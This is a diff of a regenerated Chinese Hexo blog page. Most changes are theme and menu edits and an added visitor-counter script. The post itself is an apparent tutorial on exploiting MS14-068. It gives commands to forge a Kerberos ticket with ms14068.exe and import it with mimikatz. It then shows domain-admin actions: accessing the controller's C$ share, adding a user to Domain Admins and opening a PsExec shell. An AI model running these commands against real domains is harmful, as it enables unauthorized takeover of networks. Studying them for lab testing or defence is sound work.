@@ -191,6 +191,26 @@
         </li>
       
         
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
         <li class="menu-item menu-item-archives">
           <a href="/archives/" rel="section">
             
@@ -325,14 +345,14 @@
         <p>ms14-068漏洞在域控没有打补丁（kb3011780）时，能将任意域用户，提升为域管理员权限。<br>详细介绍：<a href="http://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">深入解读MS14-068漏洞</a></p>
 <p>补充：添加域用户<a href="https://www.knowsec.net/archives/258/" target="_blank" rel="noopener">MS14-068 域用户权限提升漏洞复现</a></p>
 <ul>
-<li>ms14068.exe  伪造kerberos票据<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ms1m 4068.exe -u test@domaintest.com -p 123456 -s S-1-5-21-1607545464-3564583392-2085136103-1114</span><br><span class="line">-d WIN-0IQJV7P073G.domaintest.com</span><br></pre></td></tr></table></figure>
+<li>ms14068.exe  伪造kerberos票据<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ms1m <span class="number">4068.</span>exe -u test@domaintest.com -p <span class="number">123456</span> -s S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1607545464</span><span class="number">-3564583392</span><span class="number">-2085136103</span><span class="number">-1114</span></span><br><span class="line">-d WIN<span class="number">-0</span>IQJV7P073G.domaintest.com</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <ul>
 <li>mimikatz 导入票据</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc TGT_test@domaintest.com.ccache&quot; exit</span><br></pre></td></tr></table></figure>
-<p>拿到域管理权限便可进行其他一系列操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-0IQJV7P073G.domaintest.com\c$    注意这里应为域控主机名称，不能为ip</span><br><span class="line"></span><br><span class="line">net user admin xxxxx@password /add /domain</span><br><span class="line">net group &quot;Domain Admins&quot; admin /add /domain</span><br><span class="line"></span><br><span class="line">PsExec.exe \\192.168.111.129 cmd.exe</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"kerberos::ptc TGT_test@domaintest.com.ccache"</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+<p>拿到域管理权限便可进行其他一系列操作<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-0IQJV7P073G.domaintest.com\c$    注意这里应为域控主机名称，不能为ip</span><br><span class="line"></span><br><span class="line">net<span class="built_in"> user </span>admin xxxxx@password /<span class="builtin-name">add</span> /domain</span><br><span class="line">net<span class="built_in"> group </span><span class="string">"Domain Admins"</span> admin /<span class="builtin-name">add</span> /domain</span><br><span class="line"></span><br><span class="line">PsExec.exe \\192.168.111.129 cmd.exe</span><br></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -350,7 +370,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/域渗透/" rel="tag"># 域渗透</a>
+            <a href="/tags/域渗透/" rel="tag"><i class="fa fa-tag"></i> 域渗透</a>
           
         </div>
       
@@ -443,7 +463,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-count">36</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -453,10 +473,10 @@
               
               
               <div class="site-state-item site-state-categories">
-                
+                <a href="/categories/index.html">
                   <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
-                
+                </a>
               </div>
             
 
@@ -464,10 +484,10 @@
               
               
               <div class="site-state-item site-state-tags">
-                
-                  <span class="site-state-item-count">13</span>
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">tags</span>
-                
+                </a>
               </div>
             
 
@@ -502,7 +522,8 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -512,6 +533,11 @@
 </div>
 
 
+  <div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
   <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
 
 
